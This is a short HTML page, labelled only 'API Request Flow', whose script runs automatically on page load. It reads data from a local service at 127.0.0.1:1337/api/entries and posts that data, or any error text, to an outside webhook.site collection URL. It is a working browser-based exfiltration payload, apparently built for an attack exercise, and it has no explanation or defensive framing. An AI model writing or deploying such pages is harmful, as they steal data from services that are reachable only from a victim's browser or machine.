<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>API Requests</title>
</head>
<body>
  <h1>API Request Flow</h1>

  <script>
    // Automatically start the requests as soon as the page loads
    (async function performRequests() {
      try {
        // Step 1: Perform GET request to https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee
        await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee');

        // Step 2: Perform GET request to http://127.0.0.1:1337/api/entries
        const response = await fetch('http://127.0.0.1:1337/api/entries');
        
        if (!response.ok) {
          // Step 3: If there is an error, send the error to the webhook
          const errorData = await response.text();
          await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee/error', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ error: errorData }),
          });
        } else {
          // Step 4: If the response is successful, send the data to the webhook
          const data = await response.json();
          await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee/success', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ data: data }),
          });
        }
      } catch (error) {
        // Handle any error in the fetch process itself and send to webhook
        await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee/error1', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ error: 'Request failed: ' + error.message }),
        });
      }
    })();
  </script>
</body>
</html>
